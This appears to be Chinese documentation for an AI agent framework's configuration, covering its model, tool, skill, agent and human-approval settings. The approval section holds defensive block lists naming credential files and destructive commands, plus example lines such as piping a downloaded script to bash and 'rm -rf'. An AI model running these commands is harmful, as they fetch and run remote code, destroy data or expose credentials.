   - 默认: "base-quick"
   - 别名: `MODEL_BASIC_*` (DeepSeek deepseek-chat)

2. **reason** (推理模型) - 复杂推理任务
   - 默认: "reason-strong"
   - 别名: `MODEL_REASONING_*` (DeepSeek deepseek-reasoner)

3. **vision** (视觉模型) - 图像理解
   - 默认: "vision-capable"
   - 别名: `MODEL_MULTIMODAL_*` (GLM glm-4.5v)

4. **code** (代码模型) - 代码生成
   - 默认: "code-specialized"
   - 别名: 无

5. **chat** (对话模型) - 长上下文对话
   - 默认: "chat-long-context"
   - 别名: `MODEL_CHAT_*` (Moonshot kimi-k2-0905-preview)

**别名支持** (兼容旧配置):
- `MODEL_BASIC_*` → `MODEL_BASE_*`
- `MODEL_REASONING_*` → `MODEL_REASON_*`
- `MODEL_MULTIMODAL_*` → `MODEL_VISION_*`

**特点**:
- ✅ 自动从 `.env` 加载（无需手动 `os.getenv()`）
- ✅ 类型验证（Pydantic）
- ✅ 支持多提供商（OpenAI/DeepSeek/GLM/Moonshot）

---

### 1.2 GovernanceSettings - 运行时治理

**用途**: 控制 Agent 运行时行为

**配置参数**:
```bash
# 自动审批写操作（默认关闭，需要HITL审批）
AUTO_APPROVE_WRITES=false

# 最大循环次数（防止无限循环）
MAX_LOOPS=500              # 范围: 1-500，默认500

# 历史消息保留数量（防止内存溢出）
MAX_MESSAGE_HISTORY=500    # 默认500条
```

**用途场景**:
- `AUTO_APPROVE_WRITES`: 测试环境可开启，生产环境禁用
- `MAX_LOOPS`: Agent Loop最大迭代次数，防止死循环
- `MAX_MESSAGE_HISTORY`: 限制内存中保留的消息数量

---

### 1.3 ObservabilitySettings - 可观测性

**用途**: 配置日志、追踪、会话持久化

**配置参数**:
```bash
# LangSmith 追踪
LANGSMITH_PROJECT=my-agent-project
LANGSMITH_API_KEY=lsv2_xxx
LANGCHAIN_TRACING_V2=true           # 启用追踪

# 日志配置
LOG_PROMPT_MAX_LENGTH=500           # 日志中Prompt最大长度

# 会话持久化
SESSION_DB_PATH=data/sessions.db    # SQLite数据库路径
```

**特点**:
- ✅ LangSmith集成 - 自动上传追踪数据
- ✅ 日志截断 - 防止日志过长
- ✅ SQLite持久化 - 会话数据存储

---

### 1.4 ContextManagementSettings - 上下文压缩

**用途**: 自动上下文压缩，防止超出模型上下文窗口

**配置参数**:
```bash
# 启用/禁用上下文管理
CONTEXT_MANAGEMENT_ENABLED=true

# 三级阈值监控
CONTEXT_INFO_THRESHOLD=0.70        # 70% - 记录info日志
CONTEXT_WARNING_THRESHOLD=0.80     # 80% - 记录warning日志
CONTEXT_CRITICAL_THRESHOLD=0.95    # 95% - 触发自动压缩

# 保留策略
CONTEXT_KEEP_RECENT_RATIO=0.20     # 保留20%上下文窗口作为"最近消息"
CONTEXT_KEEP_RECENT_MESSAGES=10    # 或至少保留10条消息（取先到达者）

# 压缩触发条件
CONTEXT_MIN_MESSAGES_TO_COMPRESS=5 # 至少5条消息才压缩

# 应急回退（如果LLM压缩失败）
CONTEXT_MAX_HISTORY_MESSAGES=100   # 保留最近100条消息
```

**工作原理**:
1. **Token监控**: 每次LLM调用后统计 `cumulative_prompt_tokens`
2. **阈值检测**: 达到95%时，Planner设置 `needs_compression=True`
3. **路由压缩**: 条件路由导向 `summarization` 节点
4. **LLM压缩**: 旧消息压缩为摘要，保留最近消息
5. **回退机制**: 如果失败，直接截断保留最近100条

**典型效果**:
- 302条消息 (~123K tokens, 96%使用率) → 13条消息 (~6.5K tokens, 95%压缩率)

---

### 1.5 DocumentSettings - 文档处理

**用途**: 配置文档读取、索引、搜索行为

**配置参数**:
```python
# 文件大小限制
text_file_max_size: int = 50_000      # 纯文本文件最大字符数
pdf_preview_pages: int = 5            # PDF预览页数

# 文档分块参数
chunk_max_size: int = 400             # 索引分块大小（字符）
chunk_overlap: int = 80               # 分块重叠（防止语义断裂）

# 搜索配置
use_jieba: bool = True                # 启用中文分词（Jieba）
search_algorithm: str = "bm25"        # 搜索算法（bm25 | tfidf）
index_backend: str = "fts5"           # 索引后端（fts5 | json）
```

**特点**:
- ✅ **多格式支持**: PDF/DOCX/XLSX/PPTX
- ✅ **智能预览**: 小文件全文，大文件预览
- ✅ **FTS5索引**: SQLite全文搜索，支持中文
- ✅ **多策略搜索**: 短语匹配(10分) > Trigrams(5分) > Bigrams(3分) > 关键词(2分)

---

## 2. tools.yaml - 工具配置（144行）

### 架构设计

```yaml
tools.yaml
├── core: {}                    # 13个核心工具（总是启用）
├── optional: {}                # 10个可选工具（按需启用）
├── directories: {}             # 工具目录配置
└── hot_reload: {}              # 热重载配置
```

### 2.1 Core Tools - 核心工具（13个）

**特点**: 总是启用，无需@mention

| 工具ID | 分类 | 标签 | 用途 |
|--------|------|------|------|
| `now` | meta | meta, time | 获取当前UTC时间 |
| `todo_write` | meta | meta, task | 写入TODO任务 |
| `todo_read` | meta | meta, task | 读取TODO任务 |
| `delegate_task` | agent | agent, delegation | 委派子任务给Subagent |
| `call_external_agent` | agent | agent, handoff | 调用外部Agent（A2A协议） |
| `ask_human` | agent | agent, hitl | 请求用户输入（HITL） |
| `read_file` | read | read, file | 读取文件（多格式） |
| `write_file` | write | write, file | 写入文件 |
| `edit_file` | write | write, file | 精确编辑文件 |
| `list_workspace_files` | read | read, file, meta | 列出工作区文件 |
| `find_files` | read | read, file, search | 文件名搜索（glob） |
| `search_file` | read | read, file, search | 内容搜索（FTS5） |
| `run_bash_command` | compute | compute, shell | 执行Bash命令 |

**配置示例**:
```yaml
core:
  now:
    category: "meta"
    tags: ["meta", "time"]
    description: "Get current UTC time"

  delegate_task:
    category: "agent"
    tags: ["agent", "delegation"]
    description: "Delegate complex multi-step tasks to an isolated agent"
```

---

### 2.2 Optional Tools - 可选工具（10个）

**特点**: 可选启用，支持 `@mention` 加载

| 工具ID | 启用状态 | 子Agent继承 | 分类 | 用途 |
|--------|----------|-------------|------|------|
| `fetch_web` | ✅ 启用 | ✅ 可继承 | network | 网页抓取（Jina Reader） |
| `search_web` | ✅ 启用 | ✅ 可继承 | network | 网页搜索（Searxng） |
| `compact_context` | ❌ 禁用 | ❌ 不可继承 | meta | 手动压缩上下文 |
| `http_fetch` | ❌ 禁用 | ✅ 可继承 | network | HTTP请求（原始） |
| `web_search` | ❌ 禁用 | ✅ 可继承 | network | 网页搜索（备选） |
| `extract_links` | ❌ 禁用 | ✅ 可继承 | read | 提取网页链接 |
| `ask_vision` | ❌ 禁用 | ✅ 可继承 | agent | 视觉模型问答 |

**配置示例**:
```yaml
optional:
  fetch_web:
    enabled: true                    # 启动时加载
    available_to_subagent: true      # 子Agent可继承
    category: "network"
    tags: ["network", "read", "web"]
    description: "Fetch web pages and convert to markdown using Jina Reader"

  compact_context:
    enabled: false                   # 不加载（需@mention）
    available_to_subagent: false     # 子Agent不可用
    category: "meta"
    tags: ["meta", "context"]
    description: "Manually trigger context compression"
```

**子Agent继承规则**:
- ✅ **Core工具**: 总是继承
- ✅ **Optional工具 + `available_to_subagent: true`**: 继承（当主Agent @mention后）
- ❌ **Optional工具 + `available_to_subagent: false`**: 不继承（防止滥用）

---

### 2.3 其他配置

**工具目录**:
```yaml
directories:
  builtin: "generalAgent/tools/builtin"   # 内置工具目录
  custom: "generalAgent/tools/custom"     # 自定义工具目录
```

**热重载** (计划中):
```yaml
hot_reload:
  enabled: false                          # 暂未启用
  watch_interval: 5                       # 监控间隔（秒）
```

---

## 3. skills.yaml - 技能配置（50行）

### 架构设计

```yaml
skills.yaml
├── global: {}         # 全局设置
├── core: []           # 核心技能（总是加载）
├── optional: {}       # 可选技能（按需加载）
└── directories: {}    # 技能目录
```

### 3.1 Global Settings

```yaml
global:
  enabled: true                        # 启用技能系统
  auto_load_on_file_upload: true       # 上传文件时自动加载技能
```

### 3.2 Core Skills

```yaml
core: []  # 默认为空（无核心技能）
```

### 3.3 Optional Skills（4个）

| 技能ID | 启用状态 | 自动加载文件类型 | 描述 |
|--------|----------|------------------|------|
| `pdf` | ❌ 禁用 | `["pdf"]` | PDF处理和表单填写 |
| `docx` | ✅ 启用 | `["docx"]` | DOCX文档处理 |
| `xlsx` | ✅ 启用 | `["xlsx"]` | Excel表格处理 |
| `pptx` | ✅ 启用 | `["pptx"]` | PowerPoint演示文稿处理 |

**配置示例**:
```yaml
optional:
  pdf:
    enabled: false                        # 默认不加载
    always_available: false
    description: "PDF processing and form filling"
    auto_load_on_file_types: ["pdf"]      # 上传PDF时自动加载

  docx:
    enabled: true                         # 启动时加载
    always_available: false
    description: "docx file processing and form filling"
    auto_load_on_file_types: ["docx"]
```

### 3.4 加载行为

**加载时机**:
1. **启动加载**: `enabled: true` 的技能
2. **@mention加载**: 用户输入 `@pdf` 时加载
3. **文件上传加载**: 上传 `.pdf` 文件时自动加载 `pdf` 技能

**Catalog过滤**:
- ✅ **`enabled: true`**: 出现在SystemMessage的技能目录中
- ❌ **`enabled: false`**: 不出现在目录中（减少Prompt噪音）

**依赖管理**:
- 自动检测 `skills/{skill_id}/requirements.txt`
- 首次加载时自动安装依赖 (`pip install -r requirements.txt`)

---

## 4. agents.yaml - Agent Card配置（217行）

### 基于A2A协议

参考标准: [A2A Protocol - Agent Discovery](https://a2a-protocol.org/latest/topics/agent-discovery/)

### 架构设计

```yaml
agents.yaml
├── global: {}         # 全局设置
├── core: {}           # 核心Agents（总是可用）
├── optional: {}       # 可选Agents（按需加载）
└── [未来扩展]
```

### 4.1 Global Settings

```yaml
global:
  enabled: true                  # 启用Agents系统
  show_in_catalog: true          # 在SystemMessage中显示Agent目录
```

### 4.2 Optional Agents（2个）

#### 4.2.1 SimpleAgent - 轻量级Agent

**基本信息**:
```yaml
simple:
  name: "SimpleAgent"
  description: "轻量级 Agent，适合快速执行简单任务（无状态，单次调用）"
  provider: "local"                                # 本地Agent
  version: "1.0.0"
  factory_path: "simpleAgent.simple_agent:SimpleAgent"
```

**Capabilities（能力特性）**:
- ✅ **stateless** - 无状态，不保留会话历史
- ✅ **fast** - 快速响应，无初始化开销
- ✅ **single_turn** - 单轮对话，一次性完成
- ✅ **template_support** - 支持自定义Prompt模板

**Skills（技能清单）** - 3个:

1. **quick_analysis** - 快速分析
   - 用途: 分析单个文件（<100行代码）或小型文档
   - 输入模式: text
   - 输出模式: markdown
   - 示例:
     - "分析 uploads/script.py 的复杂度"
     - "审查 uploads/config.json 的语法错误"
     - "检查 uploads/data.csv 的数据质量"

2. **reasoning_task** - 推理任务
   - 用途: 使用推理模型解决数学/逻辑问题
   - 示例:
     - "计算 fibonacci(100)"
     - "解决8皇后问题"
     - "证明费马大定理"

3. **code_review** - 代码审查
   - 用途: 快速代码审查（语法、风格、安全）
   - 示例:
     - "审查 uploads/api.py 的安全问题"
     - "检查 uploads/component.tsx 的 React 最佳实践"

**元数据**:
```yaml
tags: ["lightweight", "stateless", "single-turn", "fast"]
enabled: true                       # 启用
always_available: false             # 需@mention
available_to_subagent: true         # 子Agent可调用
```

---

#### 4.2.2 GeneralAgent - 全功能Agent

**基本信息**:
```yaml
general:
  name: "GeneralAgent"
  description: "完整功能的 Agent，支持技能、多轮对话、会话持久化（有状态）"
  provider: "local"
  version: "1.0.0"
  factory_path: "generalAgent.runtime.app:build_application"
```

**Capabilities（能力特性）**:
- ✅ **stateful** - 有状态，保留完整会话历史
- ✅ **multi_turn** - 支持多轮对话
- ✅ **skill_system** - 支持技能包（@mention skills）
- ✅ **hitl** - 支持人机交互审批
- ✅ **persistence** - 支持会话持久化（SQLite）
- ✅ **workspace** - 独立的工作空间隔离

**Skills（技能清单）** - 3个:

1. **complex_document_analysis** - 复杂文档分析
   - 用途: 分析大型文档（>10页）
   - 示例:
     - "分析 uploads/report.pdf（80页），提取所有表格数据"
     - "总结 uploads/research.docx（50页）的研究结论"

2. **skill_based_task** - 基于技能的任务
   - 用途: 需要使用技能包的任务
   - 示例:
     - "使用 @pdf 技能填写 uploads/form.pdf 表单"
     - "使用 @docx 技能修改 uploads/contract.docx 中的合同条款"

3. **multi_step_research** - 多步骤研究
   - 用途: 需要多轮工具调用的研究任务
   - 示例:
     - "研究 Python 3.13 的新特性，并生成对比报告"
     - "分析竞品的定价策略，生成市场分析报告"

**元数据**:
```yaml
tags: ["full-featured", "stateful", "multi-turn", "complex"]
enabled: false                      # 默认不启用（节点尚未实现）
always_available: false
available_to_subagent: false        # 防止无限递归
```

---

### 4.3 Handoff Pattern 使用说明

**Agent发现与调用**:
1. 系统为每个 `enabled` agent 自动生成 `transfer_to_{agent_id}` 工具
2. 用户通过 `@agent_id` 触发（如 `@simple`）
3. LLM自主选择合适的Agent

**Catalog显示模式**:
- **默认**: 精简模式（仅ID和描述，节省tokens）
- **@mention时**: 动态显示详细技能信息（在reminder中）

**示例**:
```
User> @simple 分析 uploads/script.py 的复杂度
System> [加载 SimpleAgent，显示详细技能]
LLM> [看到 transfer_to_simple 工具，调用]
SimpleAgent> [执行任务，返回结果]
```

---

### 4.4 未来扩展

**计划中的Agents**:
- **QAAgent** - 问答和知识检索
- **CodeAgent** - 代码生成和审查

---

## 5. hitl_rules.yaml - HITL审批规则（128行）

### 架构设计

```yaml
hitl_rules.yaml
├── global: {}               # 全局设置
│   ├── enabled              # 启用/禁用审批
│   ├── default_action       # 默认行为
│   └── risk_patterns        # 全局风险模式（跨工具检测）
│       ├── critical         # 严重风险
│       ├── high             # 高风险
│       └── medium           # 中等风险
└── tools: {}                # 工具特定规则
    ├── run_bash_command
    └── http_fetch
```

### 5.1 Global Settings

```yaml
global:
  enabled: true                    # 启用审批功能
  default_action: allow            # 默认允许执行
```

**默认行为**:
- `allow`: 允许执行（工具未配置时）
- `ask`: 询问用户
- `deny`: 拒绝执行

---

### 5.2 Global Risk Patterns - 跨工具检测

**用途**: 检测所有工具参数中的敏感信息和危险模式

#### Critical Risk（严重风险） - 敏感信息泄露

**检测模式**:
```yaml
critical:
  patterns:
    - "password\\s*[=:]\\s*['\"]?[\\w.-]+"        # 密码明文
    - ":\\s*password\\w+"                         # URL中的密码
    - "api[_-]?key\\s*[=:]\\s*['\"]?[\\w-]+"      # API Key
    - "secret\\s*[=:]\\s*['\"]?[\\w.-]+"          # Secret
    - "token\\s*[=:]\\s*['\"]?[\\w.-]+"           # Token
    - "private[_-]?key"                           # 私钥
    - "BEGIN (RSA|DSA|EC) PRIVATE KEY"            # PEM格式私钥
  action: require_approval
  reason: "检测到敏感信息（密码/密钥/令牌）"
```

**拦截示例**:
```python
# ❌ 会被拦截
write_file("config.py", "API_KEY=sk-123abc")
run_bash_command("curl -H 'token: xyz123' https://api.example.com")
```

---

#### High Risk（高风险） - 系统文件和危险操作

**检测模式**:
```yaml
high:
  patterns:
    - "/etc/passwd"                               # 系统用户文件
    - "/etc/shadow"                               # 系统密码文件
    - "~/.ssh/id_rsa"                            # SSH私钥
    - "~/.aws/credentials"                        # AWS凭证
    - "\\.pem$"                                   # PEM证书文件
    - "DROP\\s+(TABLE|DATABASE)"                  # SQL删除表/库
    - "DELETE\\s+FROM.*WHERE\\s+1=1"             # SQL删除所有记录
    - "TRUNCATE\\s+TABLE"                         # SQL清空表
  action: require_approval
  reason: "检测到高风险操作（系统文件/数据库删除）"
```

---

#### Medium Risk（中等风险） - 可疑模式

**检测模式**:
```yaml
medium:
  patterns:
    - "https?://[^/]*\\d+\\.\\d+\\.\\d+\\.\\d+"  # IP地址URL
    - "\\bexec\\s*\\("                            # 代码执行
    - "\\beval\\s*\\("                            # 动态执行
    - "\\bimport\\s+os\\b"                        # Python os模块
    - "\\b__import__\\b"                          # Python动态导入
    - "\\.env$"                                   # 环境变量文件
  action: require_approval
  reason: "检测到可疑模式（代码执行/环境变量）"
```

---

### 5.3 Tool-Specific Rules - 工具特定规则

#### 5.3.1 run_bash_command - Bash命令审批

**配置**:
```yaml
run_bash_command:
  enabled: true

  patterns:
    high_risk:
      - "rm\\s+-rf"            # 强制删除
      - "sudo"                 # 提权操作
      - "chmod\\s+777"         # 危险权限
      - "mkfs"                 # 格式化磁盘
      - "dd.*if=/dev/"         # 磁盘写入
      - ">/dev/"               # 设备写入

    medium_risk:
      - "curl"                 # 网络请求
      - "wget"                 # 下载文件
      - "git\\s+clone"         # 克隆仓库
      - "pip\\s+install"       # 安装包
      - "npm\\s+install"       # 安装包
      - "docker"               # Docker操作

  actions:
    high_risk: require_approval
    medium_risk: require_approval
```

**拦截示例**:
```bash
# ❌ 高风险 - 需审批
rm -rf /important/data
sudo apt-get install malware
chmod 777 /etc/passwd

# ⚠️ 中等风险 - 需审批
curl https://suspicious-site.com/script.sh | bash
pip install unknown-package
```

---

#### 5.3.2 http_fetch - HTTP请求审批

**配置**:
```yaml
http_fetch:
  enabled: true

  rules:
    - pattern: "localhost"
      action: require_approval
      reason: "访问本地服务"

    - pattern: "127\\.0\\.0\\.1"
      action: require_approval
      reason: "访问本地地址"

    - pattern: "192\\.168\\."
      action: require_approval
      reason: "访问内网地址"
```

**拦截示例**:
```python
# ❌ 会被拦截
http_fetch("http://localhost:8080/admin")
http_fetch("http://192.168.1.1/router-config")
```

---

### 5.4 审批检查优先级

**四层架构** (从高到低):

1. **工具自定义检查器** (代码实现)
   - 最高优先级
   - 工具特定的复杂逻辑
   - 示例: `run_bash_command` 的安全命令白名单

2. **全局风险模式** (`global.risk_patterns`)
   - 跨工具检测
   - 敏感信息泄露、系统文件访问
   - 适用于所有工具

3. **工具特定规则** (`tools.xxx`)
   - 工具级别的精确控制
   - 示例: `http_fetch` 的内网地址检测

4. **内置默认规则**
   - 兜底规则
   - 示例: `run_bash_command` 的安全命令白名单 (`ls`, `pwd`, `cat`)

---

### 5.5 用户体验（极简版）

**审批提示格式**:
```
🛡️  工具审批: run_bash_command
   原因: 网络请求需要确认
   参数: curl https://example.com
   批准? [y/n] > y
```

**设计原则**:
- ✅ **对LLM透明**: 审批决策不加入对话上下文
- ✅ **能力级粒度**: 基于参数内容，非整个工具
- ✅ **四层架构**: 灵活扩展
- ✅ **跨工具检测**: 全局模式防止信息泄露

---

## 6. project_root.py - 项目路径工具（56行）

### 用途

解决**跨目录运行**问题，确保无论从哪个目录启动，都能正确定位项目文件。

### 核心函数

#### 6.1 get_project_root() - 获取项目根目录

**实现**:
```python
@lru_cache(maxsize=1)
def get_project_root() -> Path:
    """获取项目根目录的绝对路径"""
    # 从当前文件位置推断
    # project_root.py -> config/ -> generalAgent/ -> project_root/
    current_file = Path(__file__).resolve()
    project_root = current_file.parent.parent.parent

    # 验证: 检查 generalAgent 目录是否存在
    if not (project_root / "generalAgent").exists():
        raise RuntimeError("Could not locate project root")

    return project_root
```

**特点**:
- ✅ 缓存结果（`lru_cache`）
- ✅ 自动验证（检查 `generalAgent/` 目录）
- ✅ 返回绝对路径

**使用示例**:
```python
root = get_project_root()
config_file = root / "generalAgent" / "config" / "tools.yaml"
logs_dir = root / "logs"
```

---

#### 6.2 resolve_project_path() - 解析相对路径

**实现**:
```python
def resolve_project_path(relative_path: str | Path) -> Path:
    """将相对于项目根的路径转为绝对路径"""
    return get_project_root() / relative_path
```

**使用示例**:
```python
logs_dir = resolve_project_path("logs")
tools_config = resolve_project_path("generalAgent/config/tools.yaml")
workspace = resolve_project_path("data/workspace/session-123")
```

---

### 使用场景

**问题**: 在不同目录运行时，相对路径会失效
```bash
# 从项目根运行 - ✅ 相对路径有效
cd /project && python main.py

# 从子目录运行 - ❌ 相对路径失效
cd /project/generalAgent && python main.py
```

**解决方案**: 使用 `project_root.py`
```python
from generalAgent.config.project_root import get_project_root

# ✅ 无论从哪个目录运行，路径都正确
root = get_project_root()
config_path = root / "generalAgent" / "config" / "tools.yaml"
```

---

## 7. skill_config_loader.py - Skills配置加载器（152行）

### 核心类: SkillConfig

**用途**: 加载和解析 `skills.yaml` 配置文件

### 7.1 初始化

```python
class SkillConfig:
    def __init__(self, config_path: Optional[Path] = None):
        self.config_path = config_path
        self.config = self._load_config()
```

**默认配置** (如果文件不存在):
```python
{
    "global": {
        "enabled": True,
        "auto_load_on_file_upload": True,
    },
    "core": [],
    "optional": {},
    "directories": {
        "builtin": "generalAgent/skills",
    },
}
```

---

### 7.2 主要方法

#### is_enabled() - 检查全局启用状态
```python
def is_enabled(self) -> bool:
    """检查skills系统是否全局启用"""
    return self.config.get("global", {}).get("enabled", True)
```

#### auto_load_on_file_upload() - 检查自动加载
```python
def auto_load_on_file_upload(self) -> bool:
    """检查是否启用文件上传自动加载"""
    return self.config.get("global", {}).get("auto_load_on_file_upload", True)
```

#### get_core_skills() - 获取核心技能列表
```python
def get_core_skills(self) -> List[str]:
    """获取核心技能列表（总是加载）"""
    return self.config.get("core", [])
```

#### get_enabled_skills() - 获取启用技能列表
```python
def get_enabled_skills(self) -> List[str]:
    """获取所有启用的技能"""
    enabled = []
    # 添加核心技能
    enabled.extend(self.get_core_skills())
    # 添加启用的可选技能
    optional = self.config.get("optional", {})
    for skill_id, skill_config in optional.items():
        if skill_config.get("enabled", False):
            enabled.append(skill_id)
    return enabled
```

#### get_skill_config() - 获取单个技能配置
```python
def get_skill_config(self, skill_id: str) -> Optional[Dict]:
    """获取特定技能的配置"""
    # 检查核心技能
    if skill_id in self.get_core_skills():
        return {"enabled": True, "always_available": True}
    # 检查可选技能
    optional = self.config.get("optional", {})
    return optional.get(skill_id)
```

#### is_skill_enabled() - 检查技能启用状态
```python
def is_skill_enabled(self, skill_id: str) -> bool:
    """检查技能是否启用"""
    config = self.get_skill_config(skill_id)
    if not config:
        return False
    return config.get("enabled", False) or skill_id in self.get_core_skills()
```

#### get_skills_for_file_type() - 根据文件类型获取技能
```python
def get_skills_for_file_type(self, file_type: str) -> List[str]:
    """获取应为文件类型自动加载的技能

    例如: 上传 .pdf 文件 -> 返回 ["pdf"]
    """
    if not self.auto_load_on_file_upload():
        return []

    skills = []
    optional = self.config.get("optional", {})
    for skill_id, skill_config in optional.items():
        auto_load_types = skill_config.get("auto_load_on_file_types", [])
        if file_type.lower() in [t.lower() for t in auto_load_types]:
            skills.append(skill_id)
    return skills
```

---

### 7.3 使用示例

```python
from generalAgent.config.skill_config_loader import load_skill_config

# 加载配置
skill_config = load_skill_config(Path("generalAgent/config/skills.yaml"))

# 检查全局启用
if skill_config.is_enabled():
    print("Skills系统已启用")

# 获取启用的技能
enabled_skills = skill_config.get_enabled_skills()
print(f"启用的技能: {enabled_skills}")  # ['docx', 'xlsx', 'pptx']

# 根据文件类型获取技能
skills = skill_config.get_skills_for_file_type("pdf")
print(f"PDF文件应加载: {skills}")  # ['pdf']

# 检查单个技能
if skill_config.is_skill_enabled("pdf"):
    print("PDF技能已启用")
else:
    print("PDF技能未启用（需@mention或上传PDF文件）")
```

---

## 8. __init__.py - 模块导出（6行）

### 内容

```python
"""Configuration helpers."""

from .settings import Settings, get_settings

__all__ = ["Settings", "get_settings"]
```

### 用途

**简化导入**:
```python
# ✅ 简洁
from generalAgent.config import get_settings

# ❌ 冗长
from generalAgent.config.settings import get_settings
```

---

## 配置最佳实践

### 1. 环境变量优先级

**.env 文件结构**:
```bash
# ========== 模型配置 ==========
# DeepSeek 基础模型
MODEL_BASIC_API_KEY=sk-xxx
MODEL_BASIC_BASE_URL=https://api.deepseek.com
MODEL_BASIC_ID=deepseek-chat

# DeepSeek 推理模型
MODEL_REASONING_API_KEY=sk-xxx
MODEL_REASONING_BASE_URL=https://api.deepseek.com
MODEL_REASONING_ID=deepseek-reasoner

# GLM 视觉模型
MODEL_MULTIMODAL_API_KEY=xxx
MODEL_MULTIMODAL_BASE_URL=https://open.bigmodel.cn/api/paas/v4
MODEL_MULTIMODAL_ID=glm-4.5v

# Moonshot 对话模型
MODEL_CHAT_API_KEY=xxx
MODEL_CHAT_BASE_URL=https://api.moonshot.cn/v1
MODEL_CHAT_ID=kimi-k2-0905-preview

# ========== 运行时治理 ==========
AUTO_APPROVE_WRITES=false
MAX_LOOPS=100
MAX_MESSAGE_HISTORY=500

# ========== 上下文管理 ==========
CONTEXT_MANAGEMENT_ENABLED=true
CONTEXT_INFO_THRESHOLD=0.75
CONTEXT_WARNING_THRESHOLD=0.85
CONTEXT_CRITICAL_THRESHOLD=0.95
CONTEXT_KEEP_RECENT_RATIO=0.15
CONTEXT_KEEP_RECENT_MESSAGES=10

# ========== 可观测性 ==========
LANGSMITH_PROJECT=my-agent-project
LANGSMITH_API_KEY=lsv2_xxx
LANGCHAIN_TRACING_V2=true

# ========== 会话持久化 ==========
SESSION_DB_PATH=data/sessions.db
```

---

### 2. YAML配置原则

**tools.yaml**:
- ✅ Core工具: 仅核心必需工具（13个）
- ✅ Optional工具: 网络、高级功能（按需启用）
- ✅ `available_to_subagent`: 谨慎设置（防止滥用）

**skills.yaml**:
- ✅ Core技能: 默认为空（减少启动开销）
- ✅ `enabled: true`: 只启用常用技能
- ✅ `auto_load_on_file_types`: 合理映射文件类型

**agents.yaml**:
- ✅ 精简Catalog: 只显示ID和描述
- ✅ 动态加载详情: @mention时才显示详细技能
- ✅ `available_to_subagent`: 防止无限递归

**hitl_rules.yaml**:
- ✅ 全局模式: 优先配置（跨工具检测）
- ✅ 工具特定规则: 精确控制
- ✅ 正则表达式: 转义特殊字符（`\\.`）

---

### 3. 配置更新流程

**修改环境变量**:
1. 编辑 `.env` 文件
2. 重启应用（Pydantic自动加载）

**修改YAML配置**:
1. 编辑 `*.yaml` 文件
2. 重启应用（YAML在启动时加载）
3. 未来: 热重载支持（`hot_reload: enabled: true`）

**配置验证**:
```python
from generalAgent.config import get_settings

settings = get_settings()
print(f"Base model: {settings.models.base}")
print(f"Max loops: {settings.governance.max_loops}")
print(f"Context threshold: {settings.context.critical_threshold}")
```

---

## 配置总结

### 配置架构优势

1. **Pydantic + YAML 混合**:
   - 环境变量（敏感信息）→ `.env` + Pydantic
   - 业务配置（工具/技能/规则）→ YAML

2. **自动加载**:
   - 无需手动 `os.getenv()`
   - 类型验证和默认值
   - 别名支持（兼容旧配置）

3. **模块化**:
   - 8个配置文件，职责清晰
   - 独立维护，易于扩展

4. **可观测性**:
   - LangSmith追踪
   - Token监控
   - 审批日志

5. **安全性**:
   - HITL四层审批
   - 全局风险模式
   - 敏感信息检测

---

## 快速参考

### 常用配置路径

```python
from generalAgent.config import get_settings
from generalAgent.config.project_root import resolve_project_path

# 获取设置
settings = get_settings()
max_loops = settings.governance.max_loops

# 获取配置文件路径
tools_yaml = resolve_project_path("generalAgent/config/tools.yaml")
skills_yaml = resolve_project_path("generalAgent/config/skills.yaml")
agents_yaml = resolve_project_path("generalAgent/config/agents.yaml")
hitl_rules_yaml = resolve_project_path("generalAgent/config/hitl_rules.yaml")

# 获取数据目录
workspace_dir = resolve_project_path("data/workspace")
logs_dir = resolve_project_path("logs")
session_db = resolve_project_path("data/sessions.db")
```

---

# 13. 安全与合规

## 概述

AgentGraph 框架将安全和隐私保护作为核心设计原则，通过多层防护机制确保用户数据安全、防止恶意操作、保护敏感信息。框架采用**纵深防御**策略，在工具执行、文件访问、网络请求、数据存储等各个环节实施安全控制。

**安全架构三大支柱**：
1. **HITL 人机协同** - 危险操作需人工审批
2. **工作区隔离** - 文件系统沙箱隔离
3. **配置化安全** - 灵活的安全策略配置

---

## 1. 威胁模型与防护策略

### 1.1 识别的威胁

| 威胁类型 | 描述 | 严重程度 | 防护措施 |
|---------|------|---------|---------|
| **命令注入** | Agent 执行恶意 Shell 命令 | Critical | HITL 审批 + 命令白名单 |
| **文件系统破坏** | 删除/修改系统文件 | Critical | 工作区隔离 + 路径验证 |
| **敏感信息泄露** | API Key/密码泄露到日志/网络 | Critical | 全局风险模式检测 |
| **路径遍历** | 访问 workspace 外的文件 | High | 路径规范化 + 安全检查 |
| **无限循环** | Agent 陷入死循环消耗资源 | High | max_loops 限制 |
| **Prompt 注入** | 用户输入篡改 Agent 行为 | Medium | Jinja2 沙箱 + 参数化 |
| **网络攻击** | 请求内网/恶意站点 | Medium | HITL 审批 + URL 检测 |
| **数据泄露** | 会话数据被非授权访问 | Medium | 本地 SQLite + 文件权限 |

---

## 2. HITL 人机协同防护

### 2.1 四层审批架构

**优先级**: 工具自定义检查器 > 全局风险模式 > 工具特定规则 > 内置默认规则

```
┌─────────────────────────────────────────┐
│ Layer 1: 工具自定义检查器（代码实现）      │  最高优先级
│ - 例: check_bash_command(args)          │  复杂逻辑
│ - 返回: ApprovalDecision                │
├─────────────────────────────────────────┤
│ Layer 2: 全局风险模式（跨工具检测）       │  次高优先级
│ - 敏感信息: password, api_key, token    │  适用所有工具
│ - 系统文件: /etc/passwd, ~/.ssh/        │
├─────────────────────────────────────────┤
│ Layer 3: 工具特定规则（hitl_rules.yaml） │  中优先级
│ - run_bash_command.patterns.high_risk  │  工具级控制
│ - http_fetch.patterns.medium_risk      │
├─────────────────────────────────────────┤
│ Layer 4: 内置默认规则（兜底逻辑）         │  最低优先级
│ - 常见危险命令: rm -rf, sudo, chmod 777 │  基础保护
└─────────────────────────────────────────┘
```

### 2.2 全局风险模式

**Critical（严重风险）** - 敏感信息泄露：

```yaml
critical:
  patterns:
    - "password\\s*[=:]\\s*['\"]?[\\w.-]+"        # 密码明文
    - "api[_-]?key\\s*[=:]\\s*['\"]?[\\w-]+"      # API Key
    - "secret\\s*[=:]\\s*['\"]?[\\w.-]+"          # Secret
    - "token\\s*[=:]\\s*['\"]?[\\w.-]+"           # Token
    - "private[_-]?key"                           # 私钥
    - "BEGIN (RSA|DSA|EC) PRIVATE KEY"            # PEM 格式私钥
  action: require_approval
  reason: "检测到敏感信息（密码/密钥/令牌）"
```

**High（高风险）** - 系统文件和危险操作：

```yaml
high:
  patterns:
    - "/etc/passwd"                               # 系统用户文件
    - "/etc/shadow"                               # 系统密码文件
    - "~/.ssh/id_rsa"                            # SSH 私钥
    - "~/.aws/credentials"                        # AWS 凭证
